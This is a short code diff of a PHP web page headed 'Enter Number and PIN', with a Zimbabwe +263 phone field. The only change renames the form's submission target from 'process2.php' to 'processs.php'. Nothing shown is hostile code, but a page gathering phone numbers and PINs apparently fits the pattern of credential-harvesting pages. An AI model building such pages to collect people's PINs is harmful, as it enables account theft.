@@ -23,7 +23,7 @@ if(isset($_GET['error'])){
 
 <h2>Enter Number and PIN</h2>
 
-<form action="process2.php" method="POST">
+<form action="processs.php" method="POST">
 
 <div class="phone-box">
     <span>🇿🇼ZW +263</span>
